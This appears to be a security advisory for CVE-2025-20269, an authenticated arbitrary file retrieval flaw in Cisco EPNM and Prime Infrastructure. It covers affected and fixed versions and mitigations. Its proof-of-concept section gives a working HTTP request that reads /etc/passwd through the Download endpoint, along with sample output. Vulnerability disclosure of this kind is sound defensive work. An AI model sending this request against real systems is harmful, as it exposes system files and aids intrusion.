## Introduction
A vulnerability has been identified in the web-based management interface of **Cisco Evolved Programmable Network Manager (EPNM)** and **Cisco Prime Infrastructure**, which could allow a remote, authenticated, low-privileged attacker to retrieve arbitrary files from the underlying file system on an affected device.

This issue has been assigned **CVE-2025-20269**.

## Technical description

The vulnerability is caused by **insufficient input validation** of specific HTTP requests sent to the management web interface.  
An authenticated attacker could send specially crafted HTTP requests to read sensitive files from the affected device.

- **Type of vulnerability**: Arbitrary File Retrieval  
- **Authentication**: required (low-privileged user)  
- **Impact**: access to sensitive files on the system  
- **Workaround**: not available  
- **Patch**: released by Cisco

## CVSS Score

| Vulnerability  | CVSSv3.1  | Attack Vector |
| --- | --- | --- |
| Sensitive Information Disclosure | 6.5 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:X/RL:X/RC:X |

## Affected products
- **Cisco EPNM**: all releases up to 8.0 included  
  - Fixed in: **8.1.1**  
- **Cisco Prime Infrastructure**: all releases up to 3.9 and 3.10  
  - Fixed in: **3.10.6 Security Update 02**

## Impact
A successful exploit could allow the attacker to gain access to **sensitive files** on the affected system.  
This access may compromise the **confidentiality** of data and provide information useful for further attacks.

## Proof of Concept (PoC)

### HTTP request
```text
GET /webacs/Download?svc=multipath&downloadZipFileName=logFiles&downloadFileListWithPath=/etc/passwd& HTTP/1.1
Host: 127.0.0.1
Cookie: JSESSIONID=...;


```

### Expected output

The response contains a ZIP file with the file specified in the request.

```
root:X:0:0:root:/root:/bin/bash
bin:X:1:1:bin:/bin:/sbin/nologin
daemon:X:2:2:daemon:/sbin:/sbin/nologin
adm:X:3:4:adm:/var/adm:/sbin/nologin
```

### Notes
- The vulnerability was discovered in Cisco EPNM 7.1.3
- An authenticated low-privileged user is required  

## Mitigations
Cisco has released software updates that fix this vulnerability. No workarounds exist.  
Administrators should upgrade to a non-vulnerable release, as indicated in the “Fixed Software” section of the official advisory.
